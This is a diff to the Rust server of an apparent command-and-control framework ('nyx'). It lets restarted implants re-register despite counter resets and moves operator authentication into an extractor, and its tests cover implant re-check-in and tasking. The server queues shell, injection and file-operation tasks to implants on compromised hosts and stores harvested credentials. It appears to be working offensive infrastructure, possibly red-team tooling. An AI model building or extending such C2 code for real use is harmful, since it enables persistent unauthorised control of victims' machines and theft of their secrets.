@@ -46,8 +46,8 @@ pub const BEACON_BODY_LIMIT: usize = FRAME_HEADER + MAX_CT_LEN + TAG_LEN + 4 * 1
 
 use axum::{
     body::Bytes,
-    extract::{ConnectInfo, DefaultBodyLimit, Query, State},
-    http::{HeaderMap, Method, StatusCode},
+    extract::{ConnectInfo, DefaultBodyLimit, FromRequestParts, Query, State},
+    http::{request::Parts, HeaderMap, Method, StatusCode},
     response::{IntoResponse, Response},
     routing::{get, post},
     Json, Router,
@@ -1430,9 +1430,13 @@ fn handle_beacon_unwrap_frame(
 }
 
 /// Resolve session key: determine whether this is a new or existing session,
-/// and return the derived/stored [`SessionKey`]. For existing sessions, the
-/// read-guard counter check is ADVISORY only — the authoritative anti-replay
-/// check lives in [`handle_existing_session`] under the write guard.
+/// and return the derived/stored [`SessionKey`]. There is deliberately NO
+/// read-guard counter check here: a stale-looking counter may be a genuine
+/// re-check-in from a restarted implant process (baked keypair → same
+/// pubkey/session key, in-memory counter reset to 0), which can only be told
+/// apart from a replay AFTER decryption. The authoritative anti-replay /
+/// re-registration decision lives in [`handle_existing_session`] under the
+/// write guard.
 fn resolve_session_key(
     st: &AppState,
     raw: &nyx_protocol::RawFrame,
@@ -1440,9 +1444,6 @@ fn resolve_session_key(
     match st.sessions.get(&raw.pubkey) {
         None => Ok((true, st.keypair.derive_for(&raw.pubkey)?)),
         Some(s) => {
-            if raw.counter <= s.last_recv {
-                anyhow::bail!("replayed/stale counter {}", raw.counter);
-            }
             if s.stale {
                 // This session was restored from the persistent store at boot
                 // with a zero-placeholder key (the live SessionKey can't be
@@ -1913,10 +1914,27 @@ fn handle_existing_session(
     plaintext: Vec<u8>,
 ) -> anyhow::Result<Vec<u8>> {
     // Subsequent messages carry task responses; we reply with queued tasks.
-    let mut s = handle_existing_session_open(st, raw, &key)?;
+    let (mut s, recheckin) = handle_existing_session_open(st, raw, &key, &plaintext)?;
     let persist_touch = handle_existing_session_touch(st, &mut s, raw);
-    let responses = TaskResponse::decode_vec(&plaintext)?;
-    let fired = handle_existing_session_buffer_results(&mut s, raw, responses);
+    let fired = match recheckin {
+        // A re-check-in frame carries a SessionInfo, not a TaskResponse
+        // batch — there is nothing to buffer.
+        Some(info) => {
+            // Refresh the live metadata from the wire (pid/hostname/user may
+            // have changed across the process restart). The one-time token is
+            // NOT re-validated and NOT stored: it was consumed at the original
+            // check-in, exactly like the restored-session path.
+            s.info = SessionInfo {
+                auth_token: None,
+                ..info
+            };
+            Vec::new()
+        }
+        None => {
+            let responses = TaskResponse::decode_vec(&plaintext)?;
+            handle_existing_session_buffer_results(&mut s, raw, responses)
+        }
+    };
     let (batch, counter) = handle_existing_session_pack_tasks(&mut s);
     // Contract 4: persist the send/recv counters after this frame (fire-and-
     // forget, off the hot path, like the touch) so both counter spaces survive
@@ -1935,26 +1953,60 @@ fn handle_existing_session(
 }
 
 /// Acquire the session under the write guard and run the AUTHORITATIVE
-/// anti-replay check — INSIDE the write guard. The advisory read-guard check
-/// above only saves a decrypt on an obvious stale frame; THIS is where replay
-/// protection is actually enforced, because the `counter <= last_recv` test
-/// and the `last_recv = counter` commit run under one `get_mut` guard and so
-/// cannot be split by a concurrent beacon for the same session. A racing
-/// replay that also passed the advisory check loses here: whichever request
-/// takes the write guard first advances `last_recv`; the other then sees
-/// `counter <= last_recv` and is rejected. (If the session vanished between
-/// the get() above and here, return a clean error — never panic.)
+/// anti-replay / re-registration decision — INSIDE the write guard. THIS is
+/// where replay protection is actually enforced, because the
+/// `counter <= last_recv` test and the `last_recv = counter` commit run under
+/// one `get_mut` guard and so cannot be split by a concurrent beacon for the
+/// same session: a racing frame carrying the same counter loses here —
+/// whichever request takes the write guard first commits `last_recv`.
+/// (If the session vanished between the get() above and here, return a clean
+/// error — never panic.)
+///
+/// Re-registration exception: a stale-looking counter whose body is a genuine
+/// [`SessionInfo`] is a RE-CHECK-IN, not a replay — a baked-keypair implant
+/// whose process restarted re-enters from counter 0 under the SAME pubkey and
+/// session key (its C2S counter is in-memory only). Rejecting it would lock
+/// the implant out until the idle GC evicts the session (24h default), so the
+/// caller re-registers: the watermark resets to the restarted implant's
+/// counter while the S2C nonce space (`send_counter`), queued tasks, results,
+/// and ownership are preserved. Trade-off, accepted by design: an attacker
+/// replaying a captured old check-in frame can likewise force a
+/// re-registration — it gains no key material and cannot forge frames, only
+/// reset the watermark (a duplicate-results / nuisance window the operator
+/// can see), which is the price of letting baked-keypair implants survive a
+/// process restart. Anything else with a stale counter is a replay and is
+/// rejected.
+///
+/// Returns the guard plus `Some(info)` when this frame is a re-check-in (the
+/// caller then skips TaskResponse buffering and refreshes the metadata).
 fn handle_existing_session_open<'a>(
     st: &'a AppState,
     raw: &nyx_protocol::RawFrame,
     key: &SessionKey,
-) -> anyhow::Result<dashmap::mapref::one::RefMut<'a, SessionId, Session>> {
+    plaintext: &[u8],
+) -> anyhow::Result<(
+    dashmap::mapref::one::RefMut<'a, SessionId, Session>,
+    Option<SessionInfo>,
+)> {
     let mut s = st
         .sessions
         .get_mut(&raw.pubkey)
         .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
+    let mut recheckin = None;
     if raw.counter <= s.last_recv {
-        anyhow::bail!("replayed/stale counter {}", raw.counter);
+        let mut r = Reader::new(plaintext);
+        match SessionInfo::decode(&mut r) {
+            Ok(info) => {
+                tracing::info!(
+                    session = %hex::encode(raw.pubkey),
+                    counter = raw.counter,
+                    last_recv = s.last_recv,
+                    "session re-registered after implant restart (counter reset)"
+                );
+                recheckin = Some(info);
+            }
+            Err(_) => anyhow::bail!("replayed/stale counter {}", raw.counter),
+        }
     }
     s.last_recv = raw.counter;
     s.last_seen = Instant::now();
@@ -1969,7 +2021,7 @@ fn handle_existing_session_open<'a>(
     if was_stale {
         s.key = key.clone();
     }
-    Ok(s)
+    Ok((s, recheckin))
 }
 
 /// Decide the throttled last_seen-only persistence write: at most one per
@@ -2181,15 +2233,16 @@ pub(crate) fn handle_frame(
     peer: &std::net::SocketAddr,
     raw: &nyx_protocol::RawFrame,
 ) -> anyhow::Result<Vec<u8>> {
-    // Decide new-vs-existing and (for existing) grab the session key. This
-    // read-guard counter check is ADVISORY only: it lets us skip the decrypt
-    // for an obvious stale replay, but it is NOT the authoritative anti-replay
-    // decision — that lives inside the write guard below (existing-session
-    // branch), where the check and the `last_recv` commit are atomic. Without
-    // that, two concurrent beacons carrying the same counter could both pass
-    // this read-guard check before either commits, defeating replay protection.
-    // (The server runs under `panic = "abort"`, so we must never panic on a
-    // missing/raced session entry — hence the clean error paths, no `.expect()`.)
+    // Decide new-vs-existing and (for existing) grab the session key. There is
+    // no read-guard counter check: a stale-looking counter may be a genuine
+    // re-check-in from a restarted implant (see handle_existing_session_open),
+    // distinguishable from a replay only AFTER decryption. The authoritative
+    // anti-replay / re-registration decision lives inside the write guard below
+    // (existing-session branch), where the check and the `last_recv` commit are
+    // atomic — two concurrent beacons carrying the same counter cannot both
+    // commit. (The server runs under `panic = "abort"`, so we must never panic
+    // on a missing/raced session entry — hence the clean error paths, no
+    // `.expect()`.)
     let (is_new, key) = resolve_session_key(st, raw)?;
 
     let plaintext = open_frame_dir(&key, Direction::ClientToServer, raw).map_err(|_| {
@@ -2322,6 +2375,34 @@ fn authenticate_open() -> AuthOutcome {
     })
 }
 
+/// Authenticated operator identity as an axum extractor.
+///
+/// Declare this BEFORE any body/parameter extractor that can reject (`Json`,
+/// `Query`) in a handler signature: axum runs `FromRequestParts` extractors
+/// in order before the body is read, so requests with missing/invalid
+/// credentials always fail with 401 first — instead of leaking a 422/400
+/// validation error (i.e. the endpoint's request schema) to unauthenticated
+/// callers (schema fingerprinting).
+///
+/// `pub` only because `implant_gen`/`kernel` handlers are `pub`; the inner
+/// identity stays `pub(crate)` — outside the crate this is an opaque guard.
+pub struct AuthOp(pub(crate) operators::OperatorIdentity);
+
+#[axum::async_trait]
+impl FromRequestParts<Arc<AppState>> for AuthOp {
+    type Rejection = Response;
+
+    async fn from_request_parts(
+        parts: &mut Parts,
+        state: &Arc<AppState>,
+    ) -> Result<Self, Self::Rejection> {
+        match authenticate(state, &parts.headers) {
+            AuthOutcome::Allowed(op) => Ok(AuthOp(op)),
+            AuthOutcome::Denied(resp) => Err(resp),
+        }
+    }
+}
+
 async fn list_sessions(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
     if let Some(r) = require_auth(&st, &headers) {
         return r;
@@ -2388,7 +2469,7 @@ enum JsonCommand {
         #[serde(default)]
         isolate: Option<bool>,
     },
-    /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp}，dest 仅 mv/cp 需要。
+    /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp,ls}，dest 仅 mv/cp 需要。
     FileOp {
         op: String,
         path: String,
@@ -2726,13 +2807,9 @@ fn parse_session_hex(s: &str) -> Option<SessionId> {
 
 async fn post_task(
     State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
+    AuthOp(op): AuthOp,
     Json(req): Json<TaskReq>,
 ) -> Response {
-    let op = match authenticate(&st, &headers) {
-        AuthOutcome::Allowed(o) => o,
-        AuthOutcome::Denied(r) => return r,
-    };
     // RBAC deny-list: tasking delivers destructive commands (shell, inject,
     // file ops, …) to beacons, so it is Admin-only. Viewer (read-only) and
     // Operator (no active tasking) are both denied — the Operator tier is
@@ -3034,13 +3111,9 @@ async fn list_creds(
 /// `(realm, user, kind)` — CS parity: a re-dump overwrites the old secret).
 async fn post_creds(
     State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
+    AuthOp(op): AuthOp,
     Json(rec): Json<nyx_store::CredRecord>,
 ) -> Response {
-    let op = match authenticate(&st, &headers) {
-        AuthOutcome::Allowed(o) => o,
-        AuthOutcome::Denied(r) => return r,
-    };
     if op.role == operators::Role::Viewer {
         return (
             StatusCode::FORBIDDEN,
@@ -3089,13 +3162,9 @@ struct CredKey {
 /// path-encoding realm/user).
 async fn delete_cred(
     State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
+    AuthOp(op): AuthOp,
     Json(key): Json<CredKey>,
 ) -> Response {
-    let op = match authenticate(&st, &headers) {
-        AuthOutcome::Allowed(o) => o,
-        AuthOutcome::Denied(r) => return r,
-    };
     // RBAC deny-list: credential deletion is destructive (destroys harvested
     // secrets), so it is Admin-only like tasking (see the `Role` enum in
     // `operators.rs`).
@@ -3346,13 +3415,9 @@ struct OwnerReq {
 /// check-in cannot clobber an assignment.
 async fn set_session_owner(
     State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
+    AuthOp(op): AuthOp,
     Json(req): Json<OwnerReq>,
 ) -> Response {
-    let op = match authenticate(&st, &headers) {
-        AuthOutcome::Allowed(o) => o,
-        AuthOutcome::Denied(r) => return r,
-    };
     // Collaboration actions are not viewer work: read-only operators cannot
     // claim sessions they may not be entitled to. Same deny-list pattern as
     // the other write endpoints.
@@ -4162,6 +4227,114 @@ mod tests {
     }
 
     #[test]
+    fn recheckin_after_implant_restart_reregisters_restored_session() {
+        // A baked-keypair implant whose PROCESS restarts re-checks-in from
+        // counter 0 under the SAME pubkey/session key (its C2S counter is
+        // in-memory only). After a SERVER restart with SQLite session restore
+        // the session is back in the registry with the persisted watermark,
+        // so the check-in arrives with counter <= last_recv. The server must
+        // recognise the genuine SessionInfo as a re-registration (implant
+        // restart), not a replay — otherwise a restarted implant can never
+        // re-enter until the 24h idle GC evicts the session.
+        let store = nyx_store::SessionStore::open_in_memory().unwrap();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        store
+            .upsert(&nyx_store::SessionRecord {
+                session_id: hex::encode(pubkey),
+                beacon_id: 9,
+                hostname: "pre-restart".into(),
+                username: "u".into(),
+                os: "linux".into(),
+                arch: 1,
+                pid: 3,
+                is_admin: 0,
+                first_seen: now_unix().saturating_sub(120),
+                last_seen: now_unix().saturating_sub(60),
+                send_counter: 17,
+                last_recv: 41,
+                owner: None,
+                auth_token: None,
+            })
+            .unwrap();
+        let persist = SessionPersistence::spawn(std::sync::Arc::new(store));
+        let st = std::sync::Arc::new(AppState {
+            sessions_db: Some(std::sync::Arc::new(persist)),
+            ..AppState::default()
+        });
+        load_persisted_sessions(&st);
+        let key = st.keypair.derive_for(&pubkey).unwrap();
+        let peer: std::net::SocketAddr = "127.0.0.1:7842".parse().unwrap();
+
+        // A task queued while the implant was down must survive the
+        // re-registration and ride the re-check-in reply.
+        st.sessions.get_mut(&pubkey).unwrap().pending.push(Task {
+            task_id: 5,
+            command: Command::Ping,
+        });
+
+        // Implant restart: a fresh SessionInfo check-in at counter 0.
+        let (_k, checkin) = checkin_frame(&st, &pubkey, 0);
+        let reply = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("a genuine re-check-in after an implant restart must re-register");
+
+        // The watermark resets to the restarted implant's counter, the S2C
+        // nonce space is NOT reset (no nonce reuse under the same key), the
+        // stale flag clears, and metadata refreshes from the wire SessionInfo.
+        {
+            let s = st.sessions.get(&pubkey).expect("session still registered");
+            assert_eq!(
+                s.last_recv, 0,
+                "C2S watermark follows the restarted implant"
+            );
+            assert_eq!(s.send_counter, 18, "S2C space resumes, never resets");
+            assert!(!s.stale);
+            assert_eq!(s.info.hostname, "test-host", "metadata refreshed");
+        }
+
+        // The reply is a normal S2C frame (counter 18 = restored 17 + 1)
+        // carrying the queued task — the implant keeps receiving tasks.
+        let raw = nyx_protocol::parse_frame(&reply).expect("reply is a frame");
+        assert_eq!(raw.counter, 18, "S2C counter resumes at restored+1");
+        let plain = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw)
+            .expect("reply decrypts under the session key");
+        let tasks = Task::decode_vec(&plain).expect("reply is a task batch");
+        assert_eq!(tasks.len(), 1, "queued task survives re-registration");
+        assert_eq!(tasks[0].task_id, 5);
+
+        // And the session keeps advancing from the reset watermark.
+        let f = response_frame(&pubkey, &key, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
+            .expect("post-restart beacon at counter 1 must succeed");
+    }
+
+    #[test]
+    fn recheckin_after_implant_restart_reregisters_live_session() {
+        // Same re-entry, but against a LIVE in-memory session (no server
+        // restart): the implant process restarts, its counter resets to 0,
+        // and its SessionInfo re-check-in must re-register rather than die
+        // on the anti-replay watermark.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7843".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 0);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("first check-in must register the session");
+        let f = response_frame(&pubkey, &key, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
+            .expect("beacon must advance");
+        assert_eq!(st.sessions.get(&pubkey).unwrap().last_recv, 1);
+
+        // Implant restart: same keypair, counter reset → SessionInfo at 0.
+        let (_k, recheckin) = checkin_frame(&st, &pubkey, 0);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &recheckin)
+            .expect("re-check-in from a restarted implant must re-register");
+        assert_eq!(st.sessions.get(&pubkey).unwrap().last_recv, 0);
+        let f = response_frame(&pubkey, &key, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
+            .expect("the restarted implant keeps beaconed counters from 1");
+    }
+
+    #[test]
     fn task_batching_respects_frame_cap_and_keeps_fifo() {
         // Contract 2: pending tasks that don't fit in ONE frame under
         // MAX_CT_LEN stay queued (FIFO); only the confirmed-encodable prefix
@@ -4705,20 +4878,22 @@ mod tests {
             .expect("check-in must register the session before tasking exit");
 
         let rt = tokio::runtime::Runtime::new().unwrap();
-        let mut auth_headers = HeaderMap::new();
-        auth_headers.insert(
-            axum::http::header::AUTHORIZATION,
-            "Bearer test-admin-token"
-                .parse()
-                .expect("valid header value"),
-        );
+        // Auth now runs in the `AuthOp` extractor (before the body), so a
+        // direct handler call injects the authenticated identity explicitly —
+        // Admin, mirroring a valid `Bearer test-admin-token` request.
+        let admin = || {
+            AuthOp(operators::OperatorIdentity {
+                name: "_legacy".into(),
+                role: operators::Role::Admin,
+            })
+        };
         let exit_body = serde_json::json!({
             "session": hex::encode(pubkey),
             "command": { "type": "exit" },
         });
         let resp = rt.block_on(post_task(
             State(st.clone()),
-            auth_headers.clone(),
+            admin(),
             Json(serde_json::from_value(exit_body).unwrap()),
         ));
         assert_eq!(resp.status(), StatusCode::OK, "Exit task must be accepted");
@@ -4729,7 +4904,7 @@ mod tests {
         });
         let resp2 = rt.block_on(post_task(
             State(st.clone()),
-            auth_headers,
+            admin(),
             Json(serde_json::from_value(ping_body).unwrap()),
         ));
         assert_eq!(resp2.status(), StatusCode::OK);
